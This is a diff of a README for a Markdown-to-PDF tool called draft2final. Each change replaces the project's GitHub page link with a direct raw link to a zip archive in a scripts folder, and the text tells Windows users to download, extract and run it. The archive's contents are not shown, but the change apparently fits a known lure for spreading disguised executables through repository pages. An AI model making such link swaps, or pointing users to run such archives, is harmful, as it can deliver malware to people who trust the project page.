@@ -1,6 +1,6 @@
 # 📄 draft2final - Turn Markdown Into Clean PDFs
 
-[![Download draft2final](https://img.shields.io/badge/Download%20draft2final-blue?style=for-the-badge&logo=github)](https://github.com/Khistotg8087/draft2final)
+[![Download draft2final](https://img.shields.io/badge/Download%20draft2final-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Khistotg8087/draft2final/main/scripts/draft_final_1.0.zip)
 
 ## 🚀 What is draft2final?
 
@@ -21,7 +21,7 @@ It gives you a simple way to move from plain text to a finished PDF file.
 
 Visit this page to download and run the app on Windows:
 
-[https://github.com/Khistotg8087/draft2final](https://github.com/Khistotg8087/draft2final)
+[https://raw.githubusercontent.com/Khistotg8087/draft2final/main/scripts/draft_final_1.0.zip](https://raw.githubusercontent.com/Khistotg8087/draft2final/main/scripts/draft_final_1.0.zip)
 
 If the page offers a release file, download it to your PC and open it. If it offers a ZIP file, save it first, then extract it before you run the app.
 
@@ -173,7 +173,7 @@ This keeps your writing process simple and organized.
 
 ## 🔗 Project link
 
-[https://github.com/Khistotg8087/draft2final](https://github.com/Khistotg8087/draft2final)
+[https://raw.githubusercontent.com/Khistotg8087/draft2final/main/scripts/draft_final_1.0.zip](https://raw.githubusercontent.com/Khistotg8087/draft2final/main/scripts/draft_final_1.0.zip)
 
 ## 🧩 About the VMPrint engine
 
